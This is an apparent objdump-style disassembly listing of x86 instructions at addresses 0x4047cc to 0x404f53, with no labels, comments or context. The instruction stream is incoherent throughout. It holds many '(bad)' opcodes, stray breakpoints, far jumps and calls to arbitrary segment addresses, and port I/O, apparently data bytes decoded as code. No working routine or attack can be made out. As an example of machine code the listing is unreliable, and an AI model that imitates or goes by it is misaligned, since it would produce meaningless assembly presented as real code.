  4047cc:	xchg   edx,eax
  4047cd:	dec    edx
  4047ce:	shr    cl,0x38
  4047d1:	loope  0x404757
  4047d3:	push   ss
  4047d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047d5:	arpl   WORD PTR [esi+0x55],sp
  4047d8:	or     al,0xb6
  4047da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047db:	or     DWORD PTR [ebx+0x31c0af7d],edx
  4047e1:	add    BYTE PTR [ebp-0x111ca10e],0xc8
  4047e8:	int3   
  4047e9:	jno    0x4047ca
  4047eb:	jae    0x4047ff
  4047ed:	pusha  
  4047ee:	sub    esi,DWORD PTR ds:0x3a3cd47d
  4047f4:	lahf   
  4047f5:	xchg   edi,eax
  4047f6:	jg     0x404870
  4047f8:	dec    esp
  4047f9:	int3   
  4047fa:	cmp    eax,0x14b91e06
  4047ff:	stos   BYTE PTR es:[edi],al
  404800:	stos   BYTE PTR es:[edi],al
  404801:	call   0x6853c492
  404806:	int3   
  404807:	addr16 enter 0x9bae,0xed
  40480c:	jae    0x404830
  40480e:	sbb    al,0xfa
  404810:	cmp    edi,DWORD PTR [esi+0x7e]
  404813:	xor    eax,0x6ec930a6
  404818:	xor    DWORD PTR [eax-0x65],ebp
  40481b:	mov    ebx,0x7cb15d5e
  404820:	pushf  
  404821:	inc    ebp
  404822:	sbb    BYTE PTR [ecx],ah
  404824:	int    0x3
  404826:	or     BYTE PTR [esp+ebp*8],bl
  404829:	dec    edi
  40482a:	jb     0x404866
  40482c:	push   ecx
  40482d:	ret    
  40482e:	jnp    0x4048aa
  404830:	pop    ebx
  404831:	nop
  404832:	mov    WORD PTR [edx],?
  404834:	lods   eax,DWORD PTR ds:[esi]
  404835:	mov    eax,ds:0x9e17fbce
  40483a:	retf   0x1921
  40483d:	repnz xor cl,BYTE PTR [edx-0x5de34f1d]
  404844:	call   0x3db4504c
  404849:	test   al,0xf
  40484b:	retf   0x8a6f
  40484e:	add    ebx,esp
  404850:	lds    esp,FWORD PTR [esi*2+0x4c2517ed]
  404857:	in     eax,0x3d
  404859:	xor    BYTE PTR [edx+edi*8+0x6e],ah
  40485d:	add    edi,eax
  40485f:	loope  0x404853
  404861:	and    BYTE PTR [edi],0xc8
  404864:	jae    0x404861
  404866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404867:	pmulhw mm1,QWORD PTR [esi+eax*4+0x1d893280]
  40486f:	je     0x4048b0
  404871:	in     eax,0xbf
  404873:	or     DWORD PTR [edi+0xa108062],edx
  404879:	fistp  WORD PTR [esp+ebp*8+0x594563e7]
  404880:	dec    edi
  404881:	mov    ds:0x1015b437,al
  404886:	mov    al,ds:0x7a2a5429
  40488b:	sub    BYTE PTR [ebx+0x18ea01f8],dl
  404891:	daa    
  404892:	and    al,0x92
  404894:	sbb    bl,bh
  404896:	inc    ebx
  404897:	(bad)  
  404898:	clc    
  404899:	test   BYTE PTR [eax+0x23a4d001],al
  40489f:	sub    dl,bh
  4048a1:	(bad)
  4048a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048a6:	pop    esi
  4048a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048a8:	adc    BYTE PTR [ecx],cl
  4048aa:	sbb    BYTE PTR [ebp-0x6077a8a7],al
  4048b0:	pop    esp
  4048b1:	cmp    BYTE PTR [esi],ah
  4048b3:	mov    edi,0x454b35f8
  4048b8:	push   ss
  4048b9:	mov    esi,0x6e68b892
  4048be:	jmp    0x6617:0xe643da11
  4048c5:	mov    al,ss:0x52ac3713
  4048cb:	inc    edx
  4048cc:	push   cs
  4048cd:	dec    edi
  4048ce:	pop    ss
  4048cf:	sub    cl,ch
  4048d1:	cmp    BYTE PTR [ebx+0x26],ch
  4048d4:	dec    esi
  4048d5:	dec    ebp
  4048d6:	daa    
  4048d7:	dec    esp
  4048d8:	push   0x19
  4048da:	shl    DWORD PTR [edx+0x1a],1
  4048dd:	sahf   
  4048de:	mov    ch,0x81
  4048e0:	lea    ebx,ds:0xe069cd5f
  4048e6:	stos   DWORD PTR es:[edi],eax
  4048e7:	ins    DWORD PTR es:[edi],dx
  4048e8:	mov    edi,0x6bcec69e
  4048ed:	ss shl ebx,cl
  4048f0:	push   0xffffff88
  4048f2:	ror    BYTE PTR [edx*4-0x457e9b2f],0xc0
  4048fa:	sub    al,0x2f
  4048fc:	xchg   ebp,eax
  4048fd:	cmp    esp,DWORD PTR [ebp-0x438c7542]
  404903:	mov    ds:0xd6e6469b,eax
  404908:	push   edi
  404909:	leave  
  40490a:	push   ecx
  40490b:	out    dx,al
  40490c:	xor    ah,al
  40490e:	mov    al,ds:0x89fa9dad
  404913:	cmp    al,0x44
  404915:	(bad)
  404918:	push   ebp
  404919:	push   0x11
  40491b:	popa   
  40491c:	jp     0x4048ee
  40491e:	dec    eax
  40491f:	sbb    bh,0xfa
  404922:	dec    ecx
  404923:	stc    
  404924:	xchg   esp,eax
  404925:	scas   eax,DWORD PTR es:[edi]
  404926:	icebp  
  404927:	and    al,0xac
  404929:	or     al,0x77
  40492b:	inc    edx
  40492c:	mov    ds:0x8463eac0,al
  404931:	and    dh,BYTE PTR [edi-0x7f42ba99]
  404937:	push   esp
  404938:	into   
  404939:	adc    BYTE PTR [edx],bl
  40493b:	xor    dh,dh
  40493d:	mov    dh,0x45
  40493f:	(bad)  
  404941:	mov    ds,WORD PTR [ecx+edi*2]
  404944:	fwait
  404945:	mov    cl,BYTE PTR [esi]
  404947:	(bad)  
  404948:	sub    al,0x6a
  40494a:	sbb    DWORD PTR [ecx-0x72],0xffffffad
  40494e:	leave  
  40494f:	loope  0x40497f
  404951:	push   0xffffffc7
  404953:	or     edx,DWORD PTR [eax]
  404955:	jb     0x4049b3
  404957:	pop    esp
  404958:	outs   dx,DWORD PTR ds:[esi]
  404959:	mov    dh,0x44
  40495b:	cdq    
  40495c:	aaa    
  40495d:	test   BYTE PTR [edi],dh
  40495f:	pop    ds
  404960:	retf   0xf27e
  404963:	int    0x9a
  404965:	enter  0xf3a7,0xe3
  404969:	cli    
  40496a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40496b:	xor    edx,edx
  40496d:	or     ebx,esi
  40496f:	mov    eax,DWORD PTR [edx]
  404971:	in     al,0x5a
  404973:	aas    
  404974:	fsubr  QWORD PTR [esi-0x24]
  404977:	xchg   esp,eax
  404978:	mov    dl,0xb7
  40497a:	cmp    DWORD PTR [eax+0x701ee350],esi
  404980:	mov    dl,0xd0
  404982:	sub    DWORD PTR [edx],eax
  404984:	loopne 0x404908
  404986:	addr16 adc al,0x41
  404989:	ja     0x404970
  40498b:	mov    bl,0xb
  40498d:	push   ebp
  40498e:	icebp  
  40498f:	jmp    ebp
  404991:	push   edx
  404992:	(bad)  
  404993:	mov    ds:0x6002e506,al
  404998:	shl    dh,0x9b
  40499b:	div    DWORD PTR [ecx+0x2583b0c7]
  4049a1:	sub    DWORD PTR [edi+0x698d562e],ecx
  4049a7:	jno    0x4049ba
  4049a9:	dec    esi
  4049aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049ab:	mov    bh,0x76
  4049ad:	inc    eax
  4049ae:	stos   DWORD PTR es:[edi],eax
  4049af:	xchg   edi,eax
  4049b0:	test   DWORD PTR [eax+0x4dea0d0f],ebx
  4049b6:	pusha  
  4049b7:	int    0xe9
  4049b9:	mov    fs,edx
  4049bb:	int    0x8a
  4049bd:	retf   0xe089
  4049c0:	inc    ebx
  4049c1:	fs mov ecx,0x80fd4dad
  4049c7:	pop    ss
  4049c8:	arpl   WORD PTR [ebx+0x3c5f4da6],si
  4049ce:	in     eax,dx
  4049cf:	mov    dh,0x8e
  4049d1:	les    edx,FWORD PTR [eax+edx*1+0x5595f861]
  4049d8:	neg    BYTE PTR [edi]
  4049da:	rcr    DWORD PTR [edx+0x62998754],cl
  4049e0:	jae    0x404998
  4049e2:	mov    dh,0x6b
  4049e4:	jecxz  0x404a10
  4049e6:	push   esi
  4049e7:	xchg   ebp,eax
  4049e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049e9:	sub    ecx,DWORD PTR [eax+0x9]
  4049ec:	daa    
  4049ed:	push   ebx
  4049ee:	inc    ebp
  4049ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049f0:	in     al,dx
  4049f1:	mov    dh,0xc
  4049f3:	push   edi
  4049f4:	pop    ebx
  4049f5:	inc    ecx
  4049f6:	xor    al,0x2
  4049f8:	pop    ebx
  4049fa:	ret    
  4049fb:	outs   dx,BYTE PTR ds:[esi]
  4049fc:	sar    BYTE PTR [ebp+0x74],cl
  4049ff:	loop   0x404a1a
  404a01:	(bad)
  404a04:	and    edx,esi
  404a06:	ins    DWORD PTR es:[edi],dx
  404a07:	mov    eax,esp
  404a09:	sub    eax,0xe86a45e5
  404a0e:	mov    ebx,0x1f98f9f7
  404a13:	out    0x1f,eax
  404a15:	mov    DWORD PTR [ebp+0x5fa2641a],edx
  404a1b:	xchg   edi,eax
  404a1c:	dec    esp
  404a1d:	ret    0xb043
  404a20:	lods   al,BYTE PTR ds:[esi]
  404a21:	js     0x404a58
  404a23:	xchg   DWORD PTR [edx+0x61e8ae00],ebx
  404a29:	adc    DWORD PTR [edx],ecx
  404a2b:	pop    eax
  404a2c:	out    dx,eax
  404a2d:	dec    ebp
  404a2e:	mov    bl,0xf2
  404a30:	xchg   edx,eax
  404a31:	dec    ebx
  404a32:	inc    eax
  404a33:	xchg   ecx,eax
  404a34:	xor    DWORD PTR [ecx-0x3],eax
  404a37:	popa   
  404a38:	mov    dl,0xd9
  404a3a:	push   ss
  404a3b:	ins    BYTE PTR es:[edi],dx
  404a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a3d:	dec    ecx
  404a3e:	mov    dl,BYTE PTR ds:0xda69fad6
  404a44:	(bad)  
  404a45:	test   DWORD PTR [esi],0xb4dda529
  404a4b:	ficom  DWORD PTR ds:0x1fb79f11
  404a51:	mov    bl,bl
  404a53:	adc    BYTE PTR es:[ecx],ch
  404a56:	jle    0x404a02
  404a58:	add    DWORD PTR [edi],esi
  404a5a:	xchg   ebp,eax
  404a5b:	sub    al,0xe2
  404a5d:	push   si
  404a5f:	jnp    0x404a62
  404a61:	xor    ecx,DWORD PTR [edx-0x1]
  404a64:	popa   
  404a65:	pop    esp
  404a66:	adc    BYTE PTR [ebp+edx*2+0x2a],ch
  404a6a:	mov    edx,0xb26d0d16
  404a6f:	or     bh,cl
  404a71:	and    dl,BYTE PTR [esi-0x1f]
  404a74:	call   0x3ac10d28
  404a79:	sar    esi,cl
  404a7b:	adc    bl,ch
  404a7d:	inc    ebx
  404a7e:	or     DWORD PTR [ebx],esi
  404a80:	inc    ecx
  404a81:	leave  
  404a82:	adc    DWORD PTR [ecx-0x7a],0xffffff92
  404a86:	sbb    al,0x5b
  404a88:	lods   eax,DWORD PTR ds:[si]
  404a8a:	test   al,0xd
  404a8c:	repz fsincos 
  404a8f:	jl     0x404ab7
  404a91:	mov    ebx,0x32c086f1
  404a96:	imul   edx,DWORD PTR [esi+edx*8],0xffffff91
  404a9a:	pop    esp
  404a9b:	mov    ebx,0x95c1fb11
  404aa0:	into   
  404aa1:	pop    esp
  404aa2:	xchg   ebx,eax
  404aa3:	inc    edi
  404aa4:	in     al,dx
  404aa5:	test   eax,0x83e26294
  404aaa:	call   DWORD PTR ds:0x4ba55639
  404ab0:	cmp    DWORD PTR [esi-0x80],0x6d23538a
  404ab7:	pushf  
  404ab8:	fwait
  404ab9:	push   0x4aa6c164
  404abe:	and    eax,esi
  404ac0:	dec    ebp
  404ac1:	enter  0x519d,0xcb
  404ac5:	dec    ecx
  404ac6:	jmp    0x1d30:0xf4dea885
  404acd:	xor    DWORD PTR ds:0x35e6b00c,esp
  404ad3:	call   0x2600:0xa20cf38f
  404ada:	lahf   
  404adb:	add    BYTE PTR [edx],al
  404add:	mov    ds:0xf9594f75,al
  404ae2:	sar    DWORD PTR [eax+edi*8+0x7c2cdb9a],1
  404ae9:	out    dx,al
  404aea:	imul   eax,eax,0xffffffba
  404aed:	(bad)  
  404aee:	out    0xd5,eax
  404af0:	out    dx,eax
  404af1:	xchg   esp,eax
  404af2:	int3   
  404af3:	in     al,0xa
  404af5:	and    al,BYTE PTR [eax]
  404af7:	pop    ecx
  404af8:	leave  
  404af9:	fcmovb st,st(7)
  404afb:	(bad)  
  404afc:	xchg   ebp,eax
  404afd:	cmp    DWORD PTR [edi+0x19],ebp
  404b00:	test   al,0xb6
  404b02:	cmp    DWORD PTR [edx+0x23ff7495],ebx
  404b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b09:	or     edi,DWORD PTR [ecx+0x487e3d91]
  404b0f:	or     eax,0x6eeeca03
  404b14:	adc    eax,0x1b9c3196
  404b19:	test   al,bl
  404b1b:	and    al,0x56
  404b1d:	mov    ebp,0x30641362
  404b22:	inc    esp
  404b23:	dec    ebx
  404b24:	das    
  404b25:	pop    ecx
  404b26:	arpl   sp,di
  404b28:	inc    esi
  404b29:	repnz fbstp TBYTE PTR ss:[esi-0x14]
  404b2e:	add    eax,eax
  404b30:	or     DWORD PTR [ebx],edi
  404b32:	cmp    bh,BYTE PTR [eax-0x15c70078]
  404b38:	leave  
  404b39:	aam    0x30
  404b3b:	push   esi
  404b3c:	aam    0x84
  404b3e:	in     eax,dx
  404b3f:	out    dx,al
  404b40:	cmp    esp,DWORD PTR [edx+0x6d7cd178]
  404b46:	adc    eax,0x5477ff3e
  404b4b:	sar    eax,cl
  404b4d:	mov    esp,0x3c2190fc
  404b52:	adc    dl,BYTE PTR [ebx]
  404b54:	lods   eax,DWORD PTR ds:[esi]
  404b55:	ja     0x404b00
  404b57:	(bad)  
  404b58:	ja     0x404bd5
  404b5a:	sub    al,ch
  404b5c:	mov    bl,0xd7
  404b5e:	lods   al,BYTE PTR ds:[esi]
  404b5f:	add    dh,BYTE PTR [ebp+eax*8+0x4d]
  404b63:	and    ah,BYTE PTR [ecx+0x2495279f]
  404b69:	cmp    BYTE PTR [esi-0x47],dl
  404b6c:	and    eax,0xe31a6090
  404b71:	push   ecx
  404b72:	cmp    eax,0x91f6bc3
  404b77:	data16 adc dh,BYTE PTR [ebp+0x7a160af2]
  404b7e:	in     eax,dx
  404b7f:	pop    ds
  404b80:	mov    bl,0xd6
  404b82:	lea    edx,[edi]
  404b84:	lods   eax,DWORD PTR ds:[esi]
  404b85:	adc    edi,DWORD PTR [esi-0x1ddd0962]
  404b8b:	or     al,0xb3
  404b8d:	xor    bl,bh
  404b8f:	jo     0x404bcb
  404b91:	push   0xad06474e
  404b96:	adc    DWORD PTR [esp+edx*2-0x35043977],edx
  404b9d:	mov    ecx,0xde4ebb3e
  404ba2:	mov    BYTE PTR [ebx+ebp*4],al
  404ba5:	mov    dl,0xa2
  404ba7:	jnp    0x404b48
  404ba9:	xchg   esp,eax
  404baa:	mov    dl,BYTE PTR [esi-0x66]
  404bad:	adc    al,0x34
  404baf:	mov    cl,0xdf
  404bb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bb2:	and    eax,0x7a6e5b63
  404bb7:	fisttp QWORD PTR [edx+0x54f6a80f]
  404bbd:	push   ecx
  404bbe:	das    
  404bbf:	lods   eax,DWORD PTR ds:[esi]
  404bc0:	daa    
  404bc1:	cmc    
  404bc2:	sbb    BYTE PTR [esi+0x76],ah
  404bc5:	je     0x404bfb
  404bc7:	mov    ebx,0x6390294b
  404bcc:	(bad)  
  404bcd:	ins    BYTE PTR es:[edi],dx
  404bce:	lea    ebx,[edi+0xdaa465]
  404bd4:	and    ah,BYTE PTR [edi+eiz*4]
  404bd7:	ins    BYTE PTR es:[edi],dx
  404bd8:	adc    al,ah
  404bda:	retf   
  404bdb:	push   eax
  404bdc:	es sti 
  404bde:	sub    DWORD PTR [ebp-0x5],edi
  404be1:	and    esi,DWORD PTR [ebp+0x55]
  404be4:	mov    ah,0xe8
  404be7:	sbb    ebx,DWORD PTR [ebp+0x7c783f50]
  404bed:	pushf  
  404bee:	fcomp  DWORD PTR [esi+ebp*4]
  404bf1:	addr16 add ch,ch
  404bf4:	push   ebp
  404bf5:	popa   
  404bf6:	pop    esi
  404bf7:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  404bf9:	xchg   esp,eax
  404bfa:	cld    
  404bfb:	pop    esi
  404bfc:	retf   
  404bfd:	shl    DWORD PTR [ebx-0x57],1
  404c00:	push   ebp
  404c01:	mov    esp,0xab04d02b
  404c06:	mov    ds:0x8293ddf7,eax
  404c0b:	xchg   ebp,eax
  404c0c:	xchg   DWORD PTR ss:[ebp-0x2f],eax
  404c10:	arpl   WORD PTR [ebx+0x131c2d29],sp
  404c16:	data16 int3 
  404c18:	ss mov eax,gs:0x411b04d6
  404c1f:	push   ebp
  404c20:	iret   
  404c21:	xor    DWORD PTR [ecx],ecx
  404c23:	loop   0x404bff
  404c25:	cmp    bl,dh
  404c27:	mov    edi,DWORD PTR [ebx]
  404c29:	mov    ds:0x80478ad3,eax
  404c2e:	mov    cl,0x86
  404c30:	setle  BYTE PTR [esi+0x54]
  404c34:	mov    esi,0x64f2a35f
  404c39:	sub    eax,0xb9501181
  404c3e:	jo     0x404bf9
  404c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c41:	xor    BYTE PTR [edx+0x5e],0xf9
  404c45:	addr16 push 0x10
  404c48:	aas    
  404c49:	dec    edi
  404c4a:	push   ss
  404c4b:	push   0x6a
  404c4d:	add    DWORD PTR [edi+0x4f4556d8],esi
  404c53:	fisttp QWORD PTR [esi-0x7e]
  404c56:	cmc    
  404c57:	addr16 ffree st(3)
  404c5a:	xchg   edi,eax
  404c5b:	jns    0x404beb
  404c5d:	or     BYTE PTR [edi],ch
  404c5f:	neg    al
  404c61:	cdq    
  404c62:	jecxz  0x404cda
  404c64:	pop    ecx
  404c65:	into   
  404c66:	lock dec esp
  404c68:	jmp    0x7e77:0x9c27549a
  404c6f:	cmc    
  404c70:	adc    ah,BYTE PTR [esi+ebx*4+0x4f618c6b]
  404c77:	and    eax,0x87ec497e
  404c7c:	cmp    esi,DWORD PTR ds:[ecx+0x1e]
  404c80:	mov    dh,0xc9
  404c82:	pop    eax
  404c83:	dec    edi
  404c84:	lahf   
  404c85:	sub    cl,BYTE PTR [ebp+0x7ff9e236]
  404c8b:	pavgw  mm2,QWORD PTR [ecx-0x3d]
  404c8f:	or     ebp,DWORD PTR [ecx+eiz*4+0x18633b95]
  404c96:	pusha  
  404c97:	retf   
  404c98:	xor    WORD PTR [ebx],di
  404c9b:	out    0x8c,al
  404c9d:	sbb    DWORD PTR [esi+edx*2],edx
  404ca0:	jle    0x404c6f
  404ca2:	sub    bl,BYTE PTR [edi]
  404ca4:	jbe    0x404c86
  404ca6:	or     edx,edx
  404ca8:	stos   DWORD PTR es:[edi],eax
  404ca9:	addr16 pop es
  404cab:	lods   al,BYTE PTR ds:[esi]
  404cac:	(bad)
  404caf:	outs   dx,BYTE PTR ds:[esi]
  404cb0:	or     eax,0xce1269e3
  404cb5:	push   ss
  404cb6:	test   BYTE PTR cs:[edx-0x30],dl
  404cba:	or     bh,BYTE PTR [edi+0x56]
  404cbd:	pop    ecx
  404cbe:	es jl  0x404cf7
  404cc1:	retf   
  404cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc3:	xor    ebp,DWORD PTR [edi+0x27178cf]
  404cc9:	jp     0x404ccc
  404ccb:	dec    edx
  404ccc:	aam    0x4b
  404cce:	jge    0x404c70
  404cd0:	rol    DWORD PTR [edx+0x38],cl
  404cd3:	jnp    0x404c55
  404cd5:	mov    esp,0x79247638
  404cda:	xchg   ebx,eax
  404cdb:	and    al,0xcc
  404cdd:	sub    ch,BYTE PTR [esi-0x3a]
  404ce0:	(bad)  
  404ce1:	jp     0x404c84
  404ce3:	adc    esp,DWORD PTR [edi]
  404ce5:	cmp    ecx,ebp
  404ce7:	stc    
  404ce8:	lock aas 
  404cea:	ja     0x404d00
  404cec:	jmp    0x404d20
  404cee:	lods   al,BYTE PTR ds:[esi]
  404cef:	bound  esp,QWORD PTR [esp+edx*4]
  404cf2:	fxch   st(5)
  404cf4:	lea    edx,[esi+0x6d]
  404cf7:	jns    0x404c9f
  404cf9:	jle    0x404d6a
  404cfb:	pop    eax
  404cfc:	cmp    eax,0xe4a05877
  404d01:	jg     0x404d4f
  404d03:	pop    es
  404d04:	rcr    DWORD PTR [ecx],cl
  404d06:	add    BYTE PTR [ebp-0x3cc83ad4],ah
  404d0c:	call   0xf3db:0x1a0d978b
  404d13:	jmp    0x2a1a:0x4a634310
  404d1a:	mov    edi,esi
  404d1c:	xchg   DWORD PTR [esi],esp
  404d1e:	or     dl,BYTE PTR [ebx-0x38b2fb1b]
  404d24:	push   esi
  404d25:	imul   edi,edi,0x1b
  404d28:	mov    edi,0xdff24fdf
  404d2d:	sar    BYTE PTR [esi],cl
  404d2f:	fadd   DWORD PTR [edi-0x5e]
  404d32:	out    dx,al
  404d33:	test   edi,0xc622e176
  404d39:	jecxz  0x404cd0
  404d3b:	cwde   
  404d3c:	test   eax,0xc8297a48
  404d41:	jmp    0x918a:0x49a88281
  404d48:	mov    ebp,0xb218b412
  404d4d:	mov    dl,0x21
  404d4f:	pop    es
  404d50:	adc    esp,DWORD PTR [edi+0x787bc047]
  404d56:	cs loop 0x404d51
  404d59:	cli    
  404d5a:	pop    ebp
  404d5b:	popf   
  404d5c:	pop    ebx
  404d5d:	or     BYTE PTR [ebx],cl
  404d5f:	arpl   WORD PTR [edi-0x6824c3e7],cx
  404d65:	fnstenv [edx+0x50]
  404d68:	in     eax,dx
  404d69:	and    al,0x85
  404d6b:	stos   DWORD PTR es:[edi],eax
  404d6c:	sub    dl,al
  404d6e:	fs pop edx
  404d70:	xchg   ecx,eax
  404d71:	sub    ch,BYTE PTR [eax]
  404d73:	out    dx,al
  404d74:	adc    BYTE PTR [edi+0xb565531],dh
  404d7a:	nop
  404d7b:	add    edi,DWORD PTR [esi-0x5b]
  404d7e:	push   esp
  404d7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d80:	fnstcw WORD PTR ds:0x3b46be74
  404d86:	sub    esp,ebx
  404d88:	push   edi
  404d89:	(bad)  
  404d8a:	retf   0xe9ed
  404d8d:	jns    0x404d4e
  404d8f:	pop    ds
  404d90:	fwait
  404d91:	dec    esp
  404d92:	js     0x404d9d
  404d94:	sub    al,0xe6
  404d96:	imul   ecx,DWORD PTR [ecx-0x8],0xf37c2127
  404d9d:	fild   WORD PTR [edi+0x59f765de]
  404da3:	xchg   edi,eax
  404da4:	lea    esi,fs:[eax+0x1393f76b]
  404dab:	cmp    BYTE PTR [edi],0xc6
  404dae:	ficomp DWORD PTR [eax+0xf]
  404db1:	xlat   BYTE PTR ds:[ebx]
  404db2:	sub    eax,0x1e4cb613
  404db7:	out    0xd1,eax
  404db9:	imul   esp,ecx,0xffffff9c
  404dbc:	pushf  
  404dbd:	push   0x49
  404dbf:	or     eax,DWORD PTR [ecx]
  404dc1:	add    eax,0x93881bc0
  404dc6:	add    BYTE PTR [ebp-0x69],bl
  404dc9:	or     esi,esp
  404dcb:	mov    ebx,ebp
  404dcd:	mov    ah,0x5b
  404dcf:	fwait
  404dd0:	rcl    BYTE PTR [edi-0x583efe96],cl
  404dd6:	mov    dh,0x1f
  404dd8:	xchg   ebp,eax
  404dd9:	pop    eax
  404dda:	fisttp WORD PTR ss:[edi-0x3f]
  404dde:	loop   0x404e1f
  404de0:	repnz adc al,0x1f
  404de3:	shl    ch,cl
  404de5:	sub    DWORD PTR [ebx],ebx
  404de7:	cmc    
  404de8:	mov    ch,0x50
  404dea:	pop    es
  404deb:	in     al,dx
  404dec:	cmp    BYTE PTR ds:0xf5cc5a12,0xff
  404df3:	std    
  404df4:	xor    ch,ch
  404df6:	ret    0x9875
  404df9:	mov    cl,0x44
  404dfb:	xlat   BYTE PTR ds:[ebx]
  404dfc:	sub    esi,DWORD PTR [ecx+ebx*8+0x64]
  404e00:	retf   
  404e01:	aaa    
  404e02:	lods   eax,DWORD PTR ds:[esi]
  404e03:	aaa    
  404e04:	stos   BYTE PTR es:[edi],al
  404e05:	inc    ecx
  404e06:	and    DWORD PTR [ecx+0x6069f2ff],eax
  404e0c:	dec    edx
  404e0d:	mov    ah,dl
  404e0f:	mov    ch,0xd7
  404e11:	push   ss
  404e12:	dec    eax
  404e13:	inc    edx
  404e14:	push   es
  404e15:	push   edi
  404e16:	int    0x4e
  404e18:	sahf   
  404e19:	aas    
  404e1a:	retf   0xac85
  404e1d:	pusha  
  404e1e:	add    eax,0x78a23296
  404e23:	pop    ecx
  404e24:	loope  0x404dd9
  404e26:	xlat   BYTE PTR ds:[ebx]
  404e27:	push   edi
  404e28:	out    0x6,al
  404e2a:	mov    cl,0xa9
  404e2c:	inc    eax
  404e2d:	add    BYTE PTR [edi-0x15f50215],dl
  404e33:	bound  esi,QWORD PTR [eax+0x59659520]
  404e39:	pop    edi
  404e3a:	cmc    
  404e3b:	and    eax,0xca65f35
  404e40:	aad    0x31
  404e42:	add    ebx,DWORD PTR [ecx+0x61]
  404e45:	lods   eax,DWORD PTR ds:[esi]
  404e46:	aad    0x6
  404e48:	xchg   edx,eax
  404e49:	imul   ebp,esi,0x7c
  404e4c:	pop    ebp
  404e4d:	mov    edx,DWORD PTR [esi]
  404e4f:	mov    edx,0xdce77cd4
  404e54:	stos   DWORD PTR es:[edi],eax
  404e55:	jmp    0x354a:0x3f01e891
  404e5c:	mov    eax,0x2f3c72d0
  404e61:	mov    eax,ds:0x4dc82982
  404e66:	dec    ebp
  404e67:	push   eax
  404e68:	(bad)  
  404e69:	ficomp WORD PTR [eax+0x53]
  404e6c:	arpl   bx,ax
  404e6e:	or     ebx,DWORD PTR [edx+0x70]
  404e71:	bound  ebp,QWORD PTR [ebx]
  404e73:	pop    ebx
  404e74:	mul    esi
  404e76:	jno    0x404e4e
  404e78:	addr16 sub al,0x10
  404e7b:	pop    edx
  404e7c:	sahf   
  404e7d:	repz xchg esp,eax
  404e7f:	or     BYTE PTR [esi+ebx*1],dh
  404e82:	push   edx
  404e83:	adc    al,0xd0
  404e85:	adc    BYTE PTR ds:0x97fc8ee3,0xb8
  404e8c:	lods   al,BYTE PTR ds:[esi]
  404e8d:	or     ebx,esi
  404e8f:	pop    edx
  404e90:	add    edi,DWORD PTR ds:0x4a158915
  404e96:	push   0x5c
  404e98:	inc    ecx
  404e99:	and    dl,BYTE PTR [ebx-0x7e]
  404e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9d:	iret   
  404e9e:	int    0x3b
  404ea0:	mov    ds:0x711f0071,eax
  404ea5:	hlt    
  404ea6:	stos   BYTE PTR es:[edi],al
  404ea7:	jnp    0x404e4c
  404ea9:	pop    esi
  404eaa:	mov    edx,0x91793d8e
  404eaf:	jnp    0x404e64
  404eb1:	sub    dl,BYTE PTR [edi]
  404eb3:	jl     0x404eba
  404eb5:	pmullw mm0,QWORD PTR [eax]
  404eb8:	adc    esi,DWORD PTR [esp+ecx*2+0x15]
  404ebc:	or     al,0xf7
  404ebe:	cmp    al,0x32
  404ec0:	mov    esi,0x41c82bd8
  404ec5:	dec    esi
  404ec6:	xor    DWORD PTR [ecx-0x6d],ebx
  404ec9:	adc    edi,edi
  404ecb:	rol    DWORD PTR [edi],0xec
  404ece:	inc    eax
  404ecf:	cmp    ah,BYTE PTR [ebx]
  404ed1:	fmul   DWORD PTR [esi+0x2b]
  404ed4:	imul   ebx,ebp,0x69
  404ed7:	aam    0x11
  404ed9:	stc    
  404eda:	loopne 0x404ed8
  404edc:	gs inc eax
  404ede:	mov    al,ds:0x8bfe08b2
  404ee3:	sbb    al,0xce
  404ee5:	sbb    BYTE PTR [edi+0x6ce884f9],0x94
  404eec:	idiv   ebx
  404eee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eef:	test   BYTE PTR ds:0x655a9e32,dl
  404ef5:	aad    0xec
  404ef7:	scas   eax,DWORD PTR es:[edi]
  404ef8:	xchg   DWORD PTR [eax-0x33b595cf],esi
  404efe:	jmp    0x8042:0x444fce1
  404f05:	jmp    0xa4c:0x45b0d76f
  404f0c:	mov    ah,0xd
  404f0e:	sbb    eax,0x6f26e31b
  404f13:	push   0xa7e04aa1
  404f18:	out    0x79,al
  404f1a:	sbb    DWORD PTR [ecx+0x17],ecx
  404f1d:	scas   eax,DWORD PTR es:[edi]
  404f1e:	or     esp,esi
  404f20:	dec    esi
  404f21:	ret    0xc876
  404f24:	(bad)  
  404f25:	sub    DWORD PTR [edi],ecx
  404f27:	cmp    BYTE PTR [edx+0x6a],bl
  404f2a:	pop    ebx
  404f2b:	pop    esp
  404f2c:	mov    al,0x29
  404f2e:	inc    esi
  404f2f:	mov    ch,0xa3
  404f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f32:	and    bl,BYTE PTR [ebx+ebp*8]
  404f35:	dec    esi
  404f36:	jae    0x404f5e
  404f38:	loop   0x404ec4
  404f3a:	pop    ecx
  404f3b:	cmp    esi,DWORD PTR [esi]
  404f3d:	fidivr DWORD PTR [ecx+0x6f4e5783]
  404f43:	xchg   esi,eax
  404f44:	ins    BYTE PTR es:[edi],dx
  404f45:	stc    
  404f46:	jg     0x404f28
  404f48:	into   
  404f49:	inc    ebp
  404f4a:	aad    0x1c
  404f4c:	cdq    
  404f4d:	mov    ds:0x1fc6e73d,al
  404f53:	push   cs
